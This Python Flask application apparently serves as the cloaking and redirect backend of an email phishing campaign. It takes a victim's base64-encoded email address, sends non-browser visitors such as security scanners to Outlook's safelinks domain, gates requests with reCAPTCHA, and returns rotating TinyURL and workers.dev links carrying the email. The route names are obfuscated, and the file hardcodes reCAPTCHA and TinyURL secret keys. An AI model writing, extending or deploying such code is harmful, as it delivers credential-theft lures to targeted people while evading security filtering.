import urllib.request
import requests
import random
import json
from flask import Flask, jsonify, request, render_template, redirect
from flask_cors import CORS

app = Flask(__name__)

ALLOWED_ORIGINS = ["*"]

# Enable CORS with the custom origin check
CORS(app, resources={
    r"/verify_recaptcha_init": {"origins": ALLOWED_ORIGINS},
    r"/_0x35adc6": {"origins": ALLOWED_ORIGINS},
    r"/_0x3e7361": {"origins": ALLOWED_ORIGINS},
    r"/_0x3e7369": {"origins": ALLOWED_ORIGINS},
    r"/_0x4b7558": {"origins": ALLOWED_ORIGINS},
    r"/verify_recaptcha_": {"origins": ALLOWED_ORIGINS},
    })

reCaptchaSecretKey = "6LctjDcrAAAAAHuHZlB1Tjij9CDjkPMtVxeGXin1"

def verify_recaptcha_funct(token):
    url = "https://www.google.com/recaptcha/api/siteverify"
    payload = urllib.parse.urlencode({
        'secret': reCaptchaSecretKey,
        'response': token
    }).encode()
    try:
        req = urllib.request.Request(url, data=payload)
        response = urllib.request.urlopen(req)
        result = json.loads(response.read().decode())
        # return result
        return result.get('success', False), result.get('score', 2.5)
    except Exception as e:
        print(f"reCAPTCHA verification error: {str(e)}")
        return False

def is_regular_browser(user_agent):
    known_user_agents = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge']
    for ua in known_user_agents:
        if ua in user_agent:
            return True
    return False

def verify_recaptcha(token):
    """Verify reCAPTCHA token with Google's API"""
    verify_url = "https://www.google.com/recaptcha/api/siteverify"

    # Prepare the verification data
    data = urllib.parse.urlencode({
        'secret': reCaptchaSecretKey,
        'response': token
    }).encode()

    # Make the verification request
    try:
        req = urllib.request.Request(verify_url, data=data)
        response = urllib.request.urlopen(req)
        result = json.loads(response.read().decode())

        # Check if verification was successful
        return result.get('success', False)
    except Exception as e:
        print(f"reCAPTCHA verification error: {str(e)}")
        return False

def shorten_url(long_url):
    try:
        # TinyURL API endpoint
        api_url = "https://api.tinyurl.com/create"
        api_key = "so9YCGkCAMvibgD3bCofDBVjlVOeLgOAI9PzFNlf0pOLhhSyQk9CkxkhNOrK"

        headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

        payload = {
            "url": long_url,
            "description": "string"
        }

        response = requests.post(
            api_url,
            headers=headers,
            json=payload
        )
        result = response.json()
        return result['url']
    except Exception as e:
        print(f"Error shortening URL: {e}")
        return None
    return None

@app.route('/')
def index():
    try:
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr
        encoded_email = request.args.get('i')
        request_method = request.method
        print(f"Request Method: {request_method}, User-Agent: {user_agent}, IP: {ip_address}, Encoded Email: {encoded_email}")
        # logging.info(f"Request Method: {request_method}, User-Agent: {user_agent}, IP: {ip_address}, Encoded Email: {encoded_email}")


        if encoded_email and (user_agent and is_regular_browser(user_agent)):
            return render_template('index.html', email_base64=encoded_email)
        else:
            return redirect('https://nam10.safelinks.protection.outlook.com/', code=302)
    except Exception as e:
        return f"An error occurred: {e}", 500

@app.route('/verify_recaptcha_init', methods=['POST'])
def verify_recaptcha_init():
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        if not token:
            return jsonify({'success': False, 'score': 0.0, 'message': 'no token'}), 400

        if not email_base64:
            return jsonify({'success': False, 'score': 0.0, 'message': 'no base64 email'}), 400


        # return jsonify(verify_recaptcha_funct(token))

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:

            response = {
                "status": "success",
                "data": {
                    'score': score
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score, 'message': 'unknown'})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500


@app.route('/_0x35adc6', methods=['POST'])
def _0x35adc6():
    # endy main
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://tinyurl.com/2u35eyr4/#{email_base64}"

            # 1 in 500 chance of calling the api
            if(random.randint(1,500) == 1):
                tiny_url = shorten_url('https://ramevents.ae/cli/')
                if(tiny_url):
                    final_link = f"{tiny_url}/#{email_base64}"


            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/_0x3e7361', methods=['POST'])
def _0x3e7361():
    # aa main
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://tinyurl.com/2u35eyr4/#{email_base64}"

            # 1 in 500 chance of calling the api
            if(random.randint(1,500) == 1):
                tiny_url = shorten_url('https://ramevents.ae/cli/')
                if(tiny_url):
                    final_link = f"{tiny_url}/#{email_base64}"

            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/_0x4b7558', methods=['POST'])
def _0x4b7558():
    # aa second
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://16a58c83.14ed198bc779f1ccdcf0ae9e.workers.dev/?qrc={email_base64}"

            # 1 in 500 chance of calling the api
            if(random.randint(1,500) == 1):
                tiny_url = shorten_url('https://16a58c83.14ed198bc779f1ccdcf0ae9e.workers.dev/')
                if(tiny_url):
                    final_link = f"{tiny_url}??qrc={email_base64}"

            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/_0x3e7369', methods=['POST'])
def _0x3e7369():
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://tinyurl.com/52ym5dy7#{email_base64}"

            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/verify_recaptcha_init_a', methods=['POST'])
def verify_recaptcha_init_a():
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        if not token:
            return jsonify({'success': False, 'score': 0.0}), 400

        if not email_base64:
            return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://tinyurl.com/3mxyv6p3/#{email_base64}"

            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                    'score': score
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/verify_recaptcha_', methods=['POST'])
def verify_recaptcha_():
    try:
        # Get the token from the request headers
        auth_header = request.headers.get('Authorization')
        token = auth_header.split(' ')[1]
        email_base64 = request.form.get('x')

        if not token:
            return jsonify({'success': False, 'score': 0.0}), 400

        if not email_base64:
            return jsonify({'success': False, 'score': 0.0}), 400

        success, score = verify_recaptcha_funct(token)

        if success and score > 0.5:
            final_link = f"https://tinyurl.com/34ezfud9#m{email_base64}"

            response = {
                "status": "success",
                "data": {
                    "i": final_link,
                    'score': score
                }
            }
            return jsonify(response)

        return jsonify({'success': success, 'score': score})
    except Exception as e:
        return jsonify({'success': False, 'score': 0.0, 'error': e}), 500

@app.route('/verify_recaptcha_init_disabled', methods=['POST'])
def api_response():
    # Get the token from the request headers
    auth_header = request.headers.get('Authorization')

    if not auth_header or not auth_header.startswith('Bearer '):
        return jsonify({
            "status": "error",
            "message": "Invalid or missing auth token."
        }), 401

    # Extract token from Bearer header
    token = auth_header.split(' ')[1]

    # Verify the reCAPTCHA token
    is_valid, score = verify_recaptcha(token)

    if not is_valid:
        return jsonify({
            "status": "error",
            "message": "reCAPTCHA verification failed."
        }), 401

    # Get x from request body
    x = request.form.get('x')
    if not x:
        return jsonify({
            "status": "error",
            "message": "Missing required parameter 'x'."
        }), 400


    if is_valid and score > 0.1:
        final_link = f"https://tinyurl.com/3nap2484/#{x}"

        response = {
            "status": "success",
            "data": {
                "i": final_link,
                'score': score
            }
        }

        return jsonify(response)

if __name__ == "__main__":
    app.run(debug=True)
